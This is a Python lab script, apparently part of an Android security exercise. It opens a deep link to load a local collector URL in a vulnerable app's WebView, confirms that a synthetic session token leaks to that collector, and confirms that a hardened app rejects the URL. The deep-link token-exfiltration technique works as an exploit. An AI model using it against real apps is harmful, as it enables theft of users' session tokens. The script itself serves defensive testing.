"""Verify the actual WebView-to-loopback disclosure and hardened URL rejection."""
import argparse
from http.server import HTTPServer
import json
from pathlib import Path
import subprocess
import threading
from urllib.parse import parse_qs, quote, urlsplit
import xml.etree.ElementTree as ET
from collector import Handler

def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument('--adb', default='adb')
    p.add_argument('--serial', required=True)
    p.add_argument('--output', default='artifacts/evidence/webview.json')
    a = p.parse_args()
    base = [a.adb, '-s', a.serial]
    event = threading.Event()
    captured = []

    class CheckHandler(Handler):
        def do_GET(self):
            parsed = urlsplit(self.path)
            if parsed.path == '/collect':
                captured.extend(parse_qs(parsed.query).get('token', []))
                event.set()
            super().do_GET()

    server = HTTPServer(('127.0.0.1', 0), CheckHandler)
    port = server.server_port
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    def adb(*cmd):
        return subprocess.run(base+list(cmd), capture_output=True, check=True, timeout=40).stdout.decode(errors='replace')
    try:
        adb('reverse', f'tcp:{port}', f'tcp:{port}')
        target = quote(f'http://127.0.0.1:{port}/', safe='')
        adb('shell', 'am', 'start', '-W', '-a', 'android.intent.action.VIEW', '-d', f'myapp://webview?url={target}', '-p', 'com.example.vulnerable')
        if not event.wait(25) or 'LAB_SESSION_f3a9_synthetic_only' not in captured:
            raise AssertionError(f'WebView collector did not receive the synthetic session: {captured}')
        print('PASS: real WebView bridge disclosure to the loopback collector', flush=True)
        adb('shell', 'am', 'start', '-W', '-a', 'android.intent.action.VIEW', '-d', f'safelab://webview?url={target}', '-p', 'com.example.hardened')
        adb('shell', 'uiautomator', 'dump', '/sdcard/surfacelab-webview.xml')
        tree = ET.fromstring(adb('shell', 'cat', '/sdcard/surfacelab-webview.xml'))
        text = ' '.join(n.get('text', '') for n in tree.iter('node'))
        if 'BLOCKED: URL is outside' not in text:
            raise AssertionError(f'Hardened URL was not rejected: {text}')
        print('PASS: hardened WebView rejects the collector URL', flush=True)
        out = Path(a.output)
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(json.dumps({'serial': a.serial, 'received_synthetic_token': captured, 'hardened_url_blocked': True}, indent=2), encoding='utf-8')
    finally:
        subprocess.run(base+['reverse', '--remove', f'tcp:{port}'], capture_output=True, timeout=10)
        server.shutdown()
        server.server_close()

if __name__ == '__main__':
    main()
